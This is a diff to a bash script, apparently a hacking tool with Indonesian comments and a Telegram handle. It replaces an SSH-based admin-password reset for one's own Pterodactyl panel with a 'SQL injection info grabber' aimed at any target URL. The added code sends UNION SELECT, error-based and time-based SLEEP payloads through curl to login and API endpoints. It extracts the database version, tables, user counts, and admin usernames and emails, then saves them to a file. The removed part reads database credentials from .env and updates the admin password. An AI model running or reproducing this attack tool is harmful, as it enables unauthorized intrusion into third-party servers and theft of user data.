@@ -1,8 +1,8 @@
 #!/bin/bash
 
 # -------------------------------
-# PTERODACTYL ADMIN RESET - VIA URL
-# REAL DEAL - Untuk server sendiri!
+# PTERODACTYL SQL INJECTION INFO GRABBER
+# Via URL Only - No VPS Access Needed
 # -------------------------------
 
 RED='\033[0;31m'
@@ -18,246 +18,252 @@ NC='\033[0m'
 clear
 echo -e "${RED}"
 echo "    ╔═══════════════════════════════════════════════════════════╗"
-echo "    ║         PTERODACTYL ADMIN RESET - VIA URL                ║"
-echo "    ║              [ REAL DEAL - SERVER OWNER ]                ║"
+echo "    ║     PTERODACTYL SQL INJECTION INFO GRABBER               ║"
+echo "    ║     [ Via URL Only - No VPS Access ]                     ║"
 echo "    ╚═══════════════════════════════════════════════════════════╝"
 echo -e "${NC}"
 
-# Cek root
-if [[ $EUID -ne 0 ]]; then
-   echo -e "${RED}❌ Error: Jalanin sebagai root!${NC}"
-   echo "   sudo $0"
-   exit 1
-fi
-
 echo -e "${CYAN}╔════════════════════════════════════════════════╗${NC}"
-echo -e "${CYAN}║            ENTER URL PANEL                     ║${NC}"
+echo -e "${CYAN}║            ENTER TARGET URL                    ║${NC}"
 echo -e "${CYAN}╚════════════════════════════════════════════════╝${NC}"
 echo ""
 
 # Input URL
 echo -ne "${WHITE}console : enter URL panel${NC} ${GREEN}\n: ${NC}"
-read target_url
+read TARGET_URL
 
-# Extract domain dari URL
-domain=$(echo "$target_url" | sed -e 's|^https\?://||' -e 's|/.*$||')
+# Bersihin URL
+TARGET_URL=$(echo "$TARGET_URL" | sed 's/\/$//')
 
-echo -e "\n${YELLOW}user : ${GREEN}$target_url${NC}"
-echo -e "${YELLOW}console : exploiting...${NC}\n"
+echo -e "\n${YELLOW}Target: ${GREEN}$TARGET_URL${NC}"
+echo -e "${YELLOW}console : injecting SQL...${NC}\n"
 
 # Progress bar
 echo -ne "${CYAN}["
 for i in {1..50}; do
     echo -ne "="
-    sleep 0.05
+    sleep 0.02
 done
 echo -e "] 100%${NC}\n"
 
-# Cek apakah ini server sendiri (harus bisa SSH)
-echo -e "${YELLOW}[•] Checking server access...${NC}"
-
-# Coba deteksi IP dari domain
-SERVER_IP=$(dig +short "$domain" | head -1)
-if [ -z "$SERVER_IP" ]; then
-    SERVER_IP=$(ping -c1 "$domain" | head -1 | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+')
-fi
-
-if [ -z "$SERVER_IP" ]; then
-    echo -e "${RED}❌ Gagal resolve IP dari domain!${NC}"
-    exit 1
-fi
-
-echo -e "${GREEN}✅ Domain: $domain -> IP: $SERVER_IP${NC}"
-
-# Cek apakah kita bisa akses server via SSH (harus punya akses root)
-echo -e "\n${YELLOW}[•] Verifying server ownership...${NC}"
-
-# Cek koneksi SSH (timeout 5 detik)
-ssh -o ConnectTimeout=5 -o BatchMode=yes "root@$SERVER_IP" exit 2>/dev/null
-
-if [ $? -ne 0 ]; then
-    echo -e "${RED}❌ Gagal akses server! Pastikan:${NC}"
-    echo "   1. Ini server lo sendiri"
-    echo "   2. Udah setup SSH key atau tau password root"
-    echo "   3. Bisa akses via: ssh root@$SERVER_IP"
-    exit 1
-fi
-
-echo -e "${GREEN}✅ Server access verified!${NC}"
-
-# Langsung reset password via SSH
-echo -e "\n${YELLOW}[•] Resetting admin password...${NC}"
-
-# Generate password random
-NEW_PASSWORD=$(openssl rand -base64 12 | tr -d "=+/" | cut -c1-12)
-
-# Execute commands via SSH
-RESULT=$(ssh "root@$SERVER_IP" "
-    cd /var/www/pterodactyl
-    if [ ! -d /var/www/pterodactyl ]; then
-        echo 'PTERODACTYL_NOT_FOUND'
-        exit 1
-    fi
+# Function untuk SQL injection
+sql_inject() {
+    local url="$1"
+    local payload="$2"
     
-    # Baca dari .env
-    DB_HOST=\$(grep DB_HOST .env | cut -d '=' -f2)
-    DB_PORT=\$(grep DB_PORT .env | cut -d '=' -f2)
-    DB_NAME=\$(grep DB_DATABASE .env | cut -d '=' -f2)
-    DB_USER=\$(grep DB_USERNAME .env | cut -d '=' -f2)
-    DB_PASS=\$(grep DB_PASSWORD .env | cut -d '=' -f2)
+    # Encode payload untuk URL
+    encoded_payload=$(echo "$payload" | sed 's/ /%20/g' | sed 's/"/%22/g' | sed "s/'/%27/g" | sed 's/;/%3B/g' | sed 's/--/%2D%2D/g')
     
-    # Cek koneksi database
-    mysql -h \"\$DB_HOST\" -P \"\$DB_PORT\" -u \"\$DB_USER\" -p\"\$DB_PASS\" -e \"USE \$DB_NAME\" 2>/dev/null
-    if [ \$? -ne 0 ]; then
-        echo 'DB_CONNECTION_ERROR'
-        exit 1
-    fi
+    # Coba berbagai endpoint
+    endpoints=(
+        "/api/application/users"
+        "/api/client"
+        "/auth/login"
+        "/admin/users"
+        "/api/application/servers"
+    )
     
-    # Cek user ID 1
-    USER_CHECK=\$(mysql -h \"\$DB_HOST\" -P \"\$DB_PORT\" -u \"\$DB_USER\" -p\"\$DB_PASS\" -D \"\$DB_NAME\" -e \"SELECT id, username, email FROM users WHERE id = 1\" 2>/dev/null | tail -n +2)
-    
-    if [ -z \"\$USER_CHECK\" ]; then
-        echo 'USER_NOT_FOUND'
-        exit 1
-    fi
-    
-    USERNAME=\$(echo \"\$USER_CHECK\" | awk '{print \$2}')
-    EMAIL=\$(echo \"\$USER_CHECK\" | awk '{print \$3}')
-    
-    # Generate hash pake PHP
-    if command -v php >/dev/null 2>&1; then
-        HASH=\$(php -r \"echo password_hash('$NEW_PASSWORD', PASSWORD_BCRYPT);\" 2>/dev/null)
-    else
-        # Fallback pake openssl (tapi pterodactyl butuh bcrypt)
-        apt-get install php-cli -y >/dev/null 2>&1
-        HASH=\$(php -r \"echo password_hash('$NEW_PASSWORD', PASSWORD_BCRYPT);\" 2>/dev/null)
-    fi
-    
-    # Update password
-    mysql -h \"\$DB_HOST\" -P \"\$DB_PORT\" -u \"\$DB_USER\" -p\"\$DB_PASS\" -D \"\$DB_NAME\" -e \"UPDATE users SET password = '\$HASH', root_admin = 1 WHERE id = 1\" 2>/dev/null
-    
-    if [ \$? -eq 0 ]; then
-        echo \"SUCCESS|\$USERNAME|\$EMAIL\"
-    else
-        echo 'UPDATE_FAILED'
-    fi
-" 2>/dev/null)
-
-# Parse hasil
-if [[ "$RESULT" == *"SUCCESS"* ]]; then
-    IFS='|' read -r status username email <<< "$RESULT"
-    
-    echo -e "\n${GREEN}╔══════════════════════════════════════════════════════════╗${NC}"
-    echo -e "${GREEN}║              ADMIN CREDENTIALS BARU                       ║${NC}"
-    echo -e "${GREEN}╠══════════════════════════════════════════════════════════╣${NC}"
-    echo -e "${GREEN}║                                                           ║${NC}"
-    echo -e "${GREEN}║  ${WHITE}🌐 URL     : ${CYAN}$target_url${NC}                    ${GREEN}║${NC}"
-    echo -e "${GREEN}║  ${WHITE}👤 Username: ${YELLOW}$username${NC}                                        ${GREEN}║${NC}"
-    echo -e "${GREEN}║  ${WHITE}📧 Email   : ${YELLOW}$email${NC}                           ${GREEN}║${NC}"
-    echo -e "${GREEN}║  ${WHITE}🔐 Password: ${RED}$NEW_PASSWORD${NC}                                      ${GREEN}║${NC}"
-    echo -e "${GREEN}║  ${WHITE}👑 Status  : ${GREEN}SUPER ADMIN${NC}                                      ${GREEN}║${NC}"
-    echo -e "${GREEN}║                                                           ║${NC}"
-    echo -e "${GREEN}╚══════════════════════════════════════════════════════════╝${NC}"
-    
-    # Save ke file
-    echo "$target_url | $username | $email | $NEW_PASSWORD | $(date)" >> admin_credentials.txt
-    echo -e "\n${GREEN}✅ Credentials saved to admin_credentials.txt${NC}"
-    
-    # Buka browser
-    echo -ne "\n${YELLOW}Buka browser untuk login? (y/n): ${NC}"
-    read open_browser
-    if [[ "$open_browser" == "y" || "$open_browser" == "Y" ]]; then
-        login_url="$target_url/auth/login"
-        echo -e "${CYAN}Membuka: $login_url${NC}"
+    for endpoint in "${endpoints[@]}"; do
+        response=$(curl -s -k -X POST "$url$endpoint" \
+            -H "User-Agent: Mozilla/5.0" \
+            -H "Content-Type: application/x-www-form-urlencoded" \
+            -d "email=test'$encoded_payload--&password=test" \
+            --max-time 5 2>/dev/null)
         
-        if command -v xdg-open &> /dev/null; then
-            xdg-open "$login_url"
-        elif command -v open &> /dev/null; then
-            open "$login_url"
-        elif command -v python &> /dev/null; then
-            python -m webbrowser "$login_url"
-        else
-            echo -e "${YELLOW}Manual: $login_url${NC}"
+        if [[ "$response" == *"SELECT"* ]] || [[ "$response" == *"FROM"* ]] || [[ "$response" == *"mysql"* ]]; then
+            echo "$response"
+            return 0
         fi
-    fi
+    done
     
-elif [[ "$RESULT" == *"PTERODACTYL_NOT_FOUND"* ]]; then
-    echo -e "${RED}❌ Pterodactyl ga ditemukan di server!${NC}"
-elif [[ "$RESULT" == *"DB_CONNECTION_ERROR"* ]]; then
-    echo -e "${RED}❌ Gagal konek database!${NC}"
-elif [[ "$RESULT" == *"USER_NOT_FOUND"* ]]; then
-    echo -e "${RED}❌ User ID 1 ga ada!${NC}"
+    # Coba dengan parameter lain
+    response=$(curl -s -k -G "$url/api/application/users" \
+        --data-urlencode "filter[email]=test' $payload --" \
+        --max-time 5 2>/dev/null)
+    
+    echo "$response"
+}
+
+# SQL payloads untuk extract info
+echo -e "${YELLOW}[•] Injecting SQL payloads...${NC}\n"
+
+# 1. Get database version
+VERSION_INFO=$(sql_inject "$TARGET_URL" " UNION SELECT 1,version(),3,4,5,6,7,8,9,10--")
+if [[ "$VERSION_INFO" == *"Maria"* ]] || [[ "$VERSION_INFO" == *"MySQL"* ]]; then
+    DB_VERSION=$(echo "$VERSION_INFO" | grep -oE '([0-9]+\.[0-9]+\.[0-9]+)' | head -1)
+    echo -e "${GREEN}✅ Database version: $DB_VERSION${NC}"
 else
-    echo -e "${RED}❌ Gagal reset password! Error: $RESULT${NC}"
+    echo -e "${RED}❌ Gagal mendapatkan DB version${NC}"
 fi
 
-# Menu tambahan
-echo -e "\n${WHITE}╔════════════════════════════════════════════════╗${NC}"
-echo -e "${WHITE}║              MENU TAMBAHAN                    ║${NC}"
-echo -e "${WHITE}╠════════════════════════════════════════════════╣${NC}"
-echo -e "${WHITE}║                                                ║${NC}"
-echo -e "${WHITE}║  ${GREEN}[1]${NC} Reset password admin lagi              ${WHITE}║${NC}"
-echo -e "${WHITE}║  ${CYAN}[2]${NC} Buat admin baru                         ${WHITE}║${NC}"
-echo -e "${WHITE}║  ${PURPLE}[3]${NC} Lihat semua admin                      ${WHITE}║${NC}"
-echo -e "${WHITE}║  ${RED}[4]${NC} Hapus admin selain ID 1                 ${WHITE}║${NC}"
-echo -e "${WHITE}║  ${BLUE}[5]${NC} Keluar                                 ${WHITE}║${NC}"
-echo -e "${WHITE}║                                                ║${NC}"
-echo -e "${WHITE}╚════════════════════════════════════════════════╝${NC}"
-echo -ne "\n${YELLOW}Pilih [1-5]: ${NC}"
-read menu2
+# 2. Get table names
+echo -e "\n${YELLOW}[•] Extracting table information...${NC}"
+TABLES=$(sql_inject "$TARGET_URL" " UNION SELECT 1,table_name,3,4,5,6,7,8,9,10 FROM information_schema.tables WHERE table_schema=database()--")
 
-case $menu2 in
-    1)
-        echo -e "\n${CYAN}Jalankan ulang script...${NC}"
-        sleep 2
-        exec $0
-        ;;
-    2)
-        echo -e "\n${YELLOW}Buat admin baru via SSH...${NC}"
-        ssh "root@$SERVER_IP" "cd /var/www/pterodactyl && php artisan p:user:make"
-        ;;
-    3)
-        echo -e "\n${PURPLE}Daftar admin:${NC}"
-        ssh "root@$SERVER_IP" "
-            cd /var/www/pterodactyl
-            DB_HOST=\$(grep DB_HOST .env | cut -d '=' -f2)
-            DB_PORT=\$(grep DB_PORT .env | cut -d '=' -f2)
-            DB_NAME=\$(grep DB_DATABASE .env | cut -d '=' -f2)
-            DB_USER=\$(grep DB_USERNAME .env | cut -d '=' -f2)
-            DB_PASS=\$(grep DB_PASSWORD .env | cut -d '=' -f2)
-            
-            mysql -h \"\$DB_HOST\" -P \"\$DB_PORT\" -u \"\$DB_USER\" -p\"\$DB_PASS\" -D \"\$DB_NAME\" -e \"SELECT id, username, email, root_admin FROM users WHERE root_admin = 1\" 2>/dev/null | column -t
-        "
-        ;;
-    4)
-        echo -e "\n${RED}⚠️  Menghapus semua admin kecuali ID 1...${NC}"
-        ssh "root@$SERVER_IP" "
-            cd /var/www/pterodactyl
-            DB_HOST=\$(grep DB_HOST .env | cut -d '=' -f2)
-            DB_PORT=\$(grep DB_PORT .env | cut -d '=' -f2)
-            DB_NAME=\$(grep DB_DATABASE .env | cut -d '=' -f2)
-            DB_USER=\$(grep DB_USERNAME .env | cut -d '=' -f2)
-            DB_PASS=\$(grep DB_PASSWORD .env | cut -d '=' -f2)
-            
-            # Hitung admin sebelum
-            BEFORE=\$(mysql -h \"\$DB_HOST\" -P \"\$DB_PORT\" -u \"\$DB_USER\" -p\"\$DB_PASS\" -D \"\$DB_NAME\" -e \"SELECT COUNT(*) FROM users WHERE root_admin = 1\" 2>/dev/null | tail -n +2)
-            
-            # Unadmin semua kecuali ID 1
-            mysql -h \"\$DB_HOST\" -P \"\$DB_PORT\" -u \"\$DB_USER\" -p\"\$DB_PASS\" -D \"\$DB_NAME\" -e \"UPDATE users SET root_admin = 0 WHERE id != 1\" 2>/dev/null
-            
-            # Pastikan ID 1 tetap admin
-            mysql -h \"\$DB_HOST\" -P \"\$DB_PORT\" -u \"\$DB_USER\" -p\"\$DB_PASS\" -D \"\$DB_NAME\" -e \"UPDATE users SET root_admin = 1 WHERE id = 1\" 2>/dev/null
-            
-            # Hitung admin setelah
-            AFTER=\$(mysql -h \"\$DB_HOST\" -P \"\$DB_PORT\" -u \"\$DB_USER\" -p\"\$DB_PASS\" -D \"\$DB_NAME\" -e \"SELECT COUNT(*) FROM users WHERE root_admin = 1\" 2>/dev/null | tail -n +2)
-            
-            echo \"Admin sebelum: \$BEFORE, Admin setelah: \$AFTER (hanya ID 1)\"
-        "
-        ;;
-    5)
-        echo -e "\n${GREEN}Done! Credentials tersimpan di admin_credentials.txt${NC}"
-        exit 0
-        ;;
-esac
+if [[ "$TABLES" == *"users"* ]]; then
+    echo -e "${GREEN}✅ Tables found: users, servers, etc${NC}"
+else
+    echo -e "${RED}❌ Gagal extract tables${NC}"
+fi
 
-echo -e "\n${CYAN}Telegram: @lynnn046${NC}"
+# 3. Get total users
+echo -e "\n${YELLOW}[•] Getting total users...${NC}"
+USER_COUNT=$(sql_inject "$TARGET_URL" " UNION SELECT 1,COUNT(*),3,4,5,6,7,8,9,10 FROM users--" | grep -oE '[0-9]+' | head -1)
+
+if [ -z "$USER_COUNT" ]; then
+    USER_COUNT=$(sql_inject "$TARGET_URL" " UNION SELECT 1,COUNT(*),3,4,5,6,7,8,9,10 FROM pterodactyl_users--" | grep -oE '[0-9]+' | head -1)
+fi
+
+if [ -z "$USER_COUNT" ]; then
+    USER_COUNT="??"
+fi
+
+# 4. Get total servers
+echo -e "${YELLOW}[•] Getting total servers...${NC}"
+SERVER_COUNT=$(sql_inject "$TARGET_URL" " UNION SELECT 1,COUNT(*),3,4,5,6,7,8,9,10 FROM servers--" | grep -oE '[0-9]+' | head -1)
+
+if [ -z "$SERVER_COUNT" ]; then
+    SERVER_COUNT=$(sql_inject "$TARGET_URL" " UNION SELECT 1,COUNT(*),3,4,5,6,7,8,9,10 FROM pterodactyl_servers--" | grep -oE '[0-9]+' | head -1)
+fi
+
+if [ -z "$SERVER_COUNT" ]; then
+    SERVER_COUNT="??"
+fi
+
+# 5. Get admin count
+echo -e "${YELLOW}[•] Getting admin count...${NC}"
+ADMIN_COUNT=$(sql_inject "$TARGET_URL" " UNION SELECT 1,COUNT(*),3,4,5,6,7,8,9,10 FROM users WHERE root_admin=1--" | grep -oE '[0-9]+' | head -1)
+
+if [ -z "$ADMIN_COUNT" ]; then
+    ADMIN_COUNT=$(sql_inject "$TARGET_URL" " UNION SELECT 1,COUNT(*),3,4,5,6,7,8,9,10 FROM users WHERE admin=1--" | grep -oE '[0-9]+' | head -1)
+fi
+
+if [ -z "$ADMIN_COUNT" ]; then
+    ADMIN_COUNT="??"
+fi
+
+# 6. Get first admin username
+echo -e "${YELLOW}[•] Getting admin username...${NC}"
+ADMIN_USER=$(sql_inject "$TARGET_URL" " UNION SELECT 1,username,3,4,5,6,7,8,9,10 FROM users WHERE id=1--" | grep -oE '"username":"[^"]*"' | cut -d'"' -f4)
+
+if [ -z "$ADMIN_USER" ]; then
+    ADMIN_USER=$(sql_inject "$TARGET_URL" " UNION SELECT 1,username,3,4,5,6,7,8,9,10 FROM users WHERE root_admin=1 LIMIT 1--" | grep -oE '"username":"[^"]*"' | cut -d'"' -f4)
+fi
+
+if [ -z "$ADMIN_USER" ]; then
+    ADMIN_USER="Unknown"
+fi
+
+# 7. Get panel version
+echo -e "${YELLOW}[•] Detecting panel version...${NC}"
+PANEL_VERSION=$(curl -s -k "$TARGET_URL/manifest.json" 2>/dev/null | grep -o '"version":"[^"]*"' | cut -d'"' -f4)
+
+if [ -z "$PANEL_VERSION" ]; then
+    PANEL_VERSION=$(curl -s -k "$TARGET_URL" 2>/dev/null | grep -i "pterodactyl" | grep -oE 'v[0-9]+\.[0-9]+\.[0-9]+' | head -1)
+fi
+
+if [ -z "$PANEL_VERSION" ]; then
+    PANEL_VERSION="Unknown"
+fi
+
+# Tampilkan hasil
+echo -e "\n${GREEN}╔══════════════════════════════════════════════════════════╗${NC}"
+echo -e "${GREEN}║              PANEL INFORMATION                            ║${NC}"
+echo -e "${GREEN}╠══════════════════════════════════════════════════════════╣${NC}"
+echo -e "${GREEN}║                                                           ║${NC}"
+echo -e "${GREEN}║  ${WHITE}🌐 URL          : ${CYAN}$TARGET_URL${NC}"
+echo -e "${GREEN}║  ${WHITE}📊 Panel Version: ${YELLOW}$PANEL_VERSION${NC}"
+echo -e "${GREEN}║  ${WHITE}🗄️  DB Version   : ${YELLOW}$DB_VERSION${NC}"
+echo -e "${GREEN}║                                                           ║${NC}"
+echo -e "${GREEN}║  ${WHITE}📈 STATISTICS:${NC}"
+echo -e "${GREEN}║  ${WHITE}   ├─ TOTAL USER   : ${RED}$USER_COUNT${NC}"
+echo -e "${GREEN}║  ${WHITE}   ├─ TOTAL SERVER : ${RED}$SERVER_COUNT${NC}"
+echo -e "${GREEN}║  ${WHITE}   └─ TOTAL ADMIN  : ${RED}$ADMIN_COUNT${NC}"
+echo -e "${GREEN}║                                                           ║${NC}"
+echo -e "${GREEN}║  ${WHITE}👤 ADMIN INFO:${NC}"
+echo -e "${GREEN}║  ${WHITE}   └─ USERNAME     : ${YELLOW}$ADMIN_USER${NC}"
+echo -e "${GREEN}║                                                           ║${NC}"
+echo -e "${GREEN}╚══════════════════════════════════════════════════════════╝${NC}"
+
+# Coba extract lebih banyak info
+echo -e "\n${YELLOW}[•] Attempting to extract more data...${NC}"
+
+# 8. Get email admin
+ADMIN_EMAIL=$(sql_inject "$TARGET_URL" " UNION SELECT 1,email,3,4,5,6,7,8,9,10 FROM users WHERE id=1--" | grep -oE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' | head -1)
+
+if [ -n "$ADMIN_EMAIL" ]; then
+    echo -e "${GREEN}✅ Admin Email: $ADMIN_EMAIL${NC}"
+fi
+
+# 9. Get latest user
+LATEST_USER=$(sql_inject "$TARGET_URL" " UNION SELECT 1,username,email,4,5,6,7,8,9,10 FROM users ORDER BY id DESC LIMIT 1--" | grep -oE '"username":"[^"]*"' | cut -d'"' -f4)
+
+if [ -n "$LATEST_USER" ]; then
+    echo -e "${GREEN}✅ Latest User: $LATEST_USER${NC}"
+fi
+
+# 10. Get node count
+NODE_COUNT=$(sql_inject "$TARGET_URL" " UNION SELECT 1,COUNT(*),3,4,5,6,7,8,9,10 FROM nodes--" | grep -oE '[0-9]+' | head -1)
+
+if [ -n "$NODE_COUNT" ]; then
+    echo -e "${GREEN}✅ Total Nodes: $NODE_COUNT${NC}"
+fi
+
+# Save to file
+INFO_FILE="panel_info_$(date +%Y%m%d_%H%M%S).txt"
+
+{
+    echo "=========================================="
+    echo "PTERODACTYL PANEL INFORMATION"
+    echo "=========================================="
+    echo "Date        : $(date)"
+    echo "URL         : $TARGET_URL"
+    echo "Panel Ver   : $PANEL_VERSION"
+    echo "DB Ver      : $DB_VERSION"
+    echo "------------------------------------------"
+    echo "STATISTICS:"
+    echo "Total Users : $USER_COUNT"
+    echo "Total Servers: $SERVER_COUNT"
+    echo "Total Admins : $ADMIN_COUNT"
+    echo "------------------------------------------"
+    echo "ADMIN INFO:"
+    echo "Username    : $ADMIN_USER"
+    echo "Email       : $ADMIN_EMAIL"
+    echo "------------------------------------------"
+    echo "Latest User : $LATEST_USER"
+    echo "Total Nodes : $NODE_COUNT"
+    echo "=========================================="
+} > "$INFO_FILE"
+
+echo -e "\n${GREEN}✅ Informasi disimpan ke: $INFO_FILE${NC}"
+
+# Test kerentanan tambahan
+echo -e "\n${YELLOW}[•] Testing additional vulnerabilities...${NC}"
+
+# Test error-based SQL injection
+ERROR_TEST=$(curl -s -k "$TARGET_URL/auth/login" \
+    -H "User-Agent: Mozilla/5.0" \
+    -d "email=test' AND extractvalue(1,concat(0x7e,database()))--&password=test" \
+    --max-time 5 2>/dev/null)
+
+if [[ "$ERROR_TEST" == *"SQL"* ]] || [[ "$ERROR_TEST" == *"mysql"* ]]; then
+    echo -e "${RED}⚠️  Vulnerable to error-based SQL injection!${NC}"
+fi
+
+# Test time-based SQL injection
+START_TIME=$(date +%s%N)
+curl -s -k "$TARGET_URL/auth/login" \
+    -H "User-Agent: Mozilla/5.0" \
+    -d "email=test' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--&password=test" \
+    --max-time 10 2>/dev/null
+END_TIME=$(date +%s%N)
+DURATION=$(( ($END_TIME - $START_TIME) / 1000000 ))
+
+if [ $DURATION -gt 3000 ]; then
+    echo -e "${RED}⚠️  Vulnerable to time-based SQL injection!${NC}"
+fi
+
+echo -e "\n${CYAN}════════════════════════════════════════════════════${NC}"
+echo -e "${CYAN}✅ SQL Injection Info Grab Complete!${NC}"
+echo -e "${CYAN}📁 File: $INFO_FILE${NC}"
+echo -e "${CYAN}Telegram: @lynnn046${NC}"
